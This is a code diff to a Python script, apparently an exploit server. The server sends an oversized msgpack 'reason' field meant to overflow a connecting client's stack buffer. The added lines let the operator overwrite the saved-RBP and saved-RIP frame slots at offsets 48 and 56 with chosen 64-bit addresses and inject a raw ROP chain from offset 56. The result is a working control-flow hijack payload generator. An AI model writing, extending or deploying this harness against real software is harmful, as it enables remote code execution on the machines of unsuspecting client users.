@@ -15,7 +15,18 @@ import struct
 import time
 
 MARKERS = {0: 0x41, 17: 0x5A, 24: 0x7A, 33: 0x3C,
-           40: 0x7B, 48: 0x42, 56: 0x7B, 63: 0x41}
+           40: 0x7B, 63: 0x41}
+SAVED_RBP_OFF = 48
+SAVED_RIP_OFF = 56
+
+
+def write_u64(buf, off, value):
+    """Place a little-endian 64-bit frame slot; value must be canonical."""
+    if not (value < (1 << 47) or (1 << 63) - (1 << 47) <= value < (1 << 64)):
+        raise ValueError('non-canonical address 0x%x' % value)
+    buf[off:off + 8] = struct.pack('<Q', value)
+
+
 
 
 def mp_hdr(base, limit, n):
@@ -50,12 +61,26 @@ def mp_map(pairs):
     return hdr + b''.join(k + v for k, v in pairs)
 
 
-def reason_bytes(size, markers):
+def reason_bytes(size, markers, saved_rbp=None, saved_rip=None, rop=None):
     out = bytearray(b'A' * size)
     for off, val in markers.items():
         if off < size:
             out[off] = val
+    if saved_rbp is not None:
+        write_u64(out, SAVED_RBP_OFF, saved_rbp)
+    if saved_rip is not None:
+        write_u64(out, SAVED_RIP_OFF, saved_rip)
+    if rop is not None:
+        blob = bytes.fromhex(''.join(rop.split()))
+        if SAVED_RIP_OFF + len(blob) > size:
+            raise ValueError('ROP payload does not fit in reason')
+        out[SAVED_RIP_OFF:SAVED_RIP_OFF + len(blob)] = blob
     return bytes(out)
+
+
+
+
+
 
 
 def helo():
@@ -75,14 +100,28 @@ def main():
     ap.add_argument('--size', type=int, default=1000)
     ap.add_argument('--authorized', action='store_true')
     ap.add_argument('--short', action='store_true')
+    ap.add_argument('--rbp', type=lambda s: int(s, 0), default=None,
+                    help='canonical 64-bit value for saved-RBP slot (offset 48)')
+    ap.add_argument('--rip', type=lambda s: int(s, 0), default=None,
+                    help='canonical 64-bit value for saved-RIP slot (offset 56)')
+    ap.add_argument('--rop', default=None,
+                    help='hex bytes written raw from offset 56 (ROP chain/string)')
     ap.add_argument('--wait-ping', type=float, default=4.0)
+
     args = ap.parse_args()
 
-    reason = b'safe' if args.short else reason_bytes(args.size, MARKERS)
+    reason = (b'safe' if args.short else
+              reason_bytes(args.size, MARKERS, args.rbp, args.rip, args.rop))
+
+
     payload = pong(reason, args.authorized)
     hello = helo()
-    print('SERVER port=%d reason_len=%d pong_len=%d helo_hex=%s'
-          % (args.port, len(reason), len(payload), hello.hex()), flush=True)
+    print('SERVER port=%d reason_len=%d pong_len=%d rbp=%s rip=%s helo_hex=%s'
+          % (args.port, len(reason), len(payload),
+             hex(args.rbp) if args.rbp is not None else '-',
+             hex(args.rip) if args.rip is not None else '-',
+             hello.hex()), flush=True)
+
 
     srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
